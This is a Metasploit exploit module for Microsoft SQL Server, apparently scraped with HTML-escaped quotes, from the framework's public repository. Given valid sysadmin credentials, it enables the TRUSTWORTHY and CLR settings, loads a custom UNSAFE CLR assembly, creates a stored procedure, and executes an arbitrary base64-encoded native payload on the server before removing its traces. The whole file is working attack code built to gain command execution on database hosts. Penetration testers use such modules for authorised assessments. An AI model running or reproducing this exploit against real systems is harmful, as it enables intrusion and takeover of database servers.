# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking

include Msf::Exploit::Remote::MSSQL

def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Microsoft SQL Server Clr Stored Procedure Payload Execution&#039;,
&#039;Description&#039; => %q{
This module executes an arbitrary native payload on a Microsoft SQL
server by loading a custom SQL CLR Assembly into the target SQL
installation, and calling it directly with a base64-encoded payload.

The module requires working credentials in order to connect directly to the
MSSQL Server.

This method requires the user to have sufficient privileges to install a custom
SQL CRL DLL, and invoke the custom stored procedure that comes with it.

This exploit does not leave any binaries on disk.

Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).
},
&#039;Author&#039; =>
[
&#039;Lee Christensen&#039;, # original idea/research
&#039;Nathan Kirk&#039;, # extra research/blog post
&#039;OJ Reeves&#039; # Metasploit module
],
&#039;License&#039; => MSF_LICENSE,
&#039;References&#039; =>
[
[&#039;URL&#039;, &#039;http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based-custom-stored-procedure/&#039;]
],
&#039;Platform&#039; => &#039;win&#039;,
&#039;Arch&#039; => [ARCH_X86, ARCH_X64],
&#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
&#039;DefaultTarget&#039; => 0,
&#039;DisclosureDate&#039; => &#039;Jan 01 1999&#039;
))

register_options(
[
OptString.new(&#039;DATABASE&#039;, [true, &#039;The database to load the CLR Assembly into.&#039;, &#039;master&#039;])
])
end

def check
unless mssql_login_datastore(datastore[&#039;DATABASE&#039;])
vprint_status(&#039;Invalid SQL Server credentials&#039;)
return Exploit::CheckCode::Detected
end

version = get_sql_version_string

unless version =~ /Server 20(05|08|12|14|16)/
vprint_status(&#039;Unsupported version of SQL Server&#039;)
return Exploit::CheckCode::Safe
end

if mssql_is_sysadmin
vprint_good "User #{datastore[&#039;USERNAME&#039;]} is a sysadmin"
Exploit::CheckCode::Vulnerable
else
Exploit::CheckCode::Safe
end
ensure
disconnect
end

def get_sql_version_string
mssql_query("select @@version", false)[:rows].first[0]
end

def get_sql_architecture(sql_version_string)
if sql_version_string =~ /(64-bit|x64)/i
ARCH_X64
else
ARCH_X86
end
end

def get_exploit_version(sql_version_string)
# keeping it simple at this point.
if sql_version_string =~ /Server (2005|2008|2012)/
&#039;v3.5&#039;
else
# assume 2014/2016 at this point.
&#039;v4.0&#039;
end
end

def set_trustworthy(on)
mssql_query("ALTER DATABASE [#{datastore[&#039;DATABASE&#039;]}] SET TRUSTWORTHY #{on ? &#039;ON&#039; : &#039;OFF&#039;}", false)
end

def is_trustworthy
# SQLi in MSF!! OMG!
result = mssql_query("SELECT CASE is_trustworthy_on WHEN 1 THEN &#039;ON&#039; ELSE &#039;OFF&#039; END FROM sys.databases WHERE name =&#039;#{datastore[&#039;DATABASE&#039;]}&#039;", false)
result[:rows][0] == &#039;ON&#039;
end

def enable_clr(enable)
query = %Q^
EXEC sp_configure &#039;show advanced options&#039;, 1;
RECONFIGURE;
EXEC sp_configure &#039;clr enabled&#039;, #{enable ? 1 : 0};
RECONFIGURE;
^
mssql_query(query, false)
end

def is_clr_enabled
result = mssql_query("SELECT CASE value WHEN 1 THEN &#039;ON&#039; ELSE &#039;OFF&#039; END FROM sys.configurations WHERE name = &#039;clr enabled&#039;", false)
result[:rows][0] == &#039;ON&#039;
end

def exploit
unless mssql_login_datastore(datastore[&#039;DATABASE&#039;])
fail_with(Failure::BadConfig, &#039;Unable to login with the given credentials&#039;)
end

unless mssql_is_sysadmin
fail_with(Failure::BadConfig, &#039;Specified user lacks sufficient permissions&#039;)
end

# This module will only support &#039;thread&#039; for EXITFUNC
# Bad things happen to SQL otherwise!
unless datastore[&#039;EXITFUNC&#039;] == &#039;thread&#039;
print_warning("Setting EXITFUNC to &#039;thread&#039; so we don&#039;t kill SQL Server")
datastore[&#039;EXITFUNC&#039;] = &#039;thread&#039;
end

sql_version = get_sql_version_string
vprint_status("Target SQL Version is:\n#{sql_version}")

sql_arch = get_sql_architecture(sql_version)
unless payload.arch.first == sql_arch
fail_with(Failure::BadConfig, "Target SQL server arch is #{sql_arch}, payload architecture is #{payload.arch.first}")
end

trustworthy = is_trustworthy
clr_enabled = is_clr_enabled

unless trustworthy
print_status(&#039;Database does not have TRUSTWORTHY setting on, enabling ...&#039;)
set_trustworthy(true)
end

unless clr_enabled
print_status(&#039;Database does not have CLR support enabled, enabling ...&#039;)
enable_clr(true)
end

exploit_version = get_exploit_version(sql_version)
print_status("Using version #{exploit_version} of the Payload Assembly")
exploit_file_path = ::File.join(Msf::Config.install_root, &#039;data&#039;,
&#039;SqlClrPayload&#039;, exploit_version, &#039;SqlClrPayload.dll&#039;)
vprint_status("Using #{exploit_file_path}")

assembly = ::File.read(exploit_file_path)

# Convert the assembly to the required format for execution of the stored
# procedure to create the custom stored proc
hex_assembly = "0x#{assembly.unpack(&#039;H*&#039;)[0]}"
asm_name = Rex::Text.rand_text_alpha(rand(4) + 8)
query = "CREATE ASSEMBLY [#{asm_name}] AUTHORIZATION [dbo] FROM #{hex_assembly} WITH PERMISSION_SET = UNSAFE"

print_status(&#039;Adding custom payload assembly ...&#039;)
mssql_query(query, false)

proc_name = Rex::Text.rand_text_alpha(rand(4) + 8)
param_name = Rex::Text.rand_text_alpha(rand(4) + 8)
query = "CREATE PROCEDURE [dbo].[#{proc_name}](@#{param_name} AS NVARCHAR(MAX)) AS EXTERNAL NAME [#{asm_name}].[StoredProcedures].[ExecuteB64Payload]"

print_status(&#039;Exposing payload execution stored procedure ...&#039;)
mssql_query(query, false)

# Generate the base64 encoded payload
b64payload = Rex::Text.encode_base64(payload.encoded)
query = "EXEC [dbo].[#{proc_name}] &#039;#{b64payload}&#039;"
print_status(&#039;Executing the payload ...&#039;)
mssql_query(query, false)

print_status(&#039;Removing stored procedure ...&#039;)
mssql_query("DROP PROCEDURE [dbo].[#{proc_name}]", false)

print_status(&#039;Removing assembly ...&#039;)
mssql_query("DROP ASSEMBLY [#{asm_name}]", false)

unless clr_enabled
print_status(&#039;Restoring CLR setting ...&#039;)
enable_clr(false)
end

unless trustworthy
print_status(&#039;Restoring Trustworthy setting ...&#039;)
set_trustworthy(false)
end

ensure
disconnect
end

end

